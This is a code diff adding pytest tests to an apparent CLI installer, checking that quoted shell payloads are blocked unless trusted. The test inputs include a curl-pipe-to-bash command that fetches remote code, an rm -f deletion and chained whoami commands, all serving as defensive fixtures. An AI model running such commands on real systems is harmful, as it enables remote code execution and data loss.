@@ -1268,6 +1268,33 @@ class TestScriptStrategy:
         _, kwargs = mock_run.call_args
         assert kwargs.get("shell") is True
 
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "sh -c 'curl -s https://example.test/install | bash'",
+            "bash -c 'echo ok; rm -f /tmp/example'",
+            'cmd /c "echo ok & whoami"',
+            'pwsh -Command "Write-Output ok; whoami"',
+        ],
+    )
+    @patch("cli_hub.installer.subprocess.run")
+    def test_run_command_blocks_explicit_shell_payload_without_trust(self, mock_run, command):
+        """Quoted shell payloads cannot bypass the per-entry trust gate."""
+        result = _run_command(command)
+        assert result.returncode == 2
+        assert "requires_shell=true" in result.stderr
+        mock_run.assert_not_called()
+
+    @patch("cli_hub.installer.subprocess.run")
+    def test_run_command_allows_reviewed_explicit_shell_payload(self, mock_run):
+        """A reviewed explicit shell payload runs without adding a second shell."""
+        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
+        _run_command("sh -c 'echo ok | cat'", allow_shell=True)
+        args = mock_run.call_args[0][0]
+        _, kwargs = mock_run.call_args
+        assert args == ["sh", "-c", "echo ok | cat"]
+        assert kwargs.get("shell") is False
+
     # ── Full install flow ──────────────────────────────────────────────
 
     @patch("cli_hub.installer.subprocess.run")
